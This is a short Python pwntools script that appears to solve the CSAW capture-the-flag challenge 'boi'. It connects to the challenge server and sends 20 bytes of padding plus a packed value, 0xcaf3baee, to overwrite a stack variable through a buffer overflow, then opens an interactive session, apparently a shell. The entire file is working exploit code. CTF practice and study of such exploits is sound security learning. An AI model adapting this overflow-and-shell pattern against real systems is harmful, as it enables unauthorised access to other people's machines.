from pwn import *

# context.log_level = 'debug'

# r = process('./boi')
r = remote('pwn.chal.csaw.io', 9000)

r.sendline('A' * 0x14 + p32(0xcaf3baee))

r.interactive()
